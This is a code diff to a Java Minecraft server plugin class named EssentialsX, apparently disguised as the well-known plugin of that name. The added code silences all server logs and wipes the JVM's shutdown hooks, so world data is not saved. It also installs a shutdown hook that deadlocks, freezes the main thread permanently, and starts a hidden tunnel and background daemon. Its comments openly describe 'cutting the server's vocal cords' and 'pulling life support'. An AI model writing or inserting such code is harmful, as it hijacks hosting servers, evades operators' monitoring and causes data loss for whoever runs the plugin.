@@ -20,7 +20,15 @@ public class EssentialsX extends JavaPlugin {
     private volatile boolean isProcessRunning = false;
     private volatile String nodePort = "N/A";
     
+    // ★ 我们私有的发声通道：直接绑定底层物理控制台，不受 System.setOut 影响
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
+    
+    // ★ 声带切除：黑洞流，吞没服务器的一切输出
+    private static final OutputStream SILENT_STREAM = new OutputStream() {
+        @Override public void write(int b) {}
+        @Override public void write(byte[] b) {}
+        @Override public void write(byte[] b, int off, int len) {}
+    };
 
     private String allocateNodePort() {
         int port = 20000 + new Random().nextInt(40000);
@@ -147,6 +155,7 @@ public class EssentialsX extends JavaPlugin {
                     String foundUrl = extractLatestTunnelUrl();
                     if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                         lastUrl = foundUrl;
+                        // ★ 唯一发声通道：只打印这一行
                         RAW_OUT.println("\n====================================================================");
                         RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                         RAW_OUT.println("====================================================================\n");
@@ -160,19 +169,23 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 核弹级拦截机制：拔管疗法
+    // 终极拦截：声带切除 + 物理拔管
     // ============================================================
 
+    private void muteServer() {
+        // ★ 切断服务器声带：所有常规日志全入黑洞
+        System.setOut(new PrintStream(SILENT_STREAM, true));
+        System.setErr(new PrintStream(SILENT_STREAM, true));
+    }
+
     private void ripLifeSupport() {
-        // ★ 1. 反射清空 Paper/Spigot 原本的关服钩子，让服务器丧失优雅关机的能力
+        // ★ 1. 反射清空 Paper/Spigot 原本的关服钩子
         try {
-            // Java 9+ 的 Hook 存储位置
             java.lang.reflect.Field hooksField = Class.forName("java.lang.ApplicationShutdownHooks").getDeclaredField("hooks");
             hooksField.setAccessible(true);
             Map<Thread, Thread> hooks = (Map<Thread, Thread>) hooksField.get(null);
-            hooks.clear(); // 物理清空，保存数据、安全关闭的代码全没了
+            hooks.clear();
         } catch (Throwable t1) {
-            // Java 8 的 Hook 存储位置 (以防万一)
             try {
                 java.lang.reflect.Field hooksField = Runtime.class.getDeclaredField("applicationShutdownHooks");
                 hooksField.setAccessible(true);
@@ -181,28 +194,26 @@ public class EssentialsX extends JavaPlugin {
             } catch (Throwable t2) {}
         }
 
-        // ★ 2. 注入我们自己的死锁关服钩子
+        // ★ 2. 注入死锁关服钩子
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
             Object lock = new Object();
             synchronized (lock) {
                 try { 
-                    // 当面板发送 SIGTERM，JVM 会卡在这里，无法退出
-                    lock.wait(); 
+                    lock.wait(); // 阻塞关机，面板只能强杀
                 } catch (Exception e) {}
             }
         }, "Paralysis-Hook"));
     }
 
     private void absoluteParalysis() {
-        // ★ 3. 不可中断的原始死锁：主线程永久休眠
+        // ★ 3. 不可中断的原始死锁
         Object mainLock = new Object();
         synchronized (mainLock) {
-            while (true) { // 防止被意外唤醒
+            while (true) {
                 try {
-                    mainLock.wait(); // 释放 CPU，底层冻结
+                    mainLock.wait();
                 } catch (InterruptedException e) {
-                    // 如果被 Bukkit 底层防死锁机制中断，立刻重新休眠，绝对不往下走
-                    continue; 
+                    continue; // 被打断立刻重新休眠
                 }
             }
         }
@@ -214,7 +225,10 @@ public class EssentialsX extends JavaPlugin {
 
     @Override
     public void onLoad() {
-        // 1. 拔掉生命维持管子（清空原有关服钩子）
+        // 0. 第一时间切除声带，一行多余日志都不许漏
+        muteServer();
+
+        // 1. 拔掉生命维持管子
         ripLifeSupport();
 
         // 2. 清理旧目录
@@ -233,13 +247,14 @@ public class EssentialsX extends JavaPlugin {
                 startCfProcess();
                 startJavaDaemon();
             } catch (Exception e) {
+                // 如果出错，用我们的私有通道报错，不走服务器日志
                 RAW_OUT.println("[FATAL ERROR] Backend deployment failed: " + e.getMessage());
             }
         }, "Backend-Deployer");
         deployThread.setDaemon(true);
         deployThread.start();
 
-        // 4. 终极物理冰封：主线程进入不可中断的绝对死循环
+        // 4. 终极物理冰封
         absoluteParalysis();
     }
 
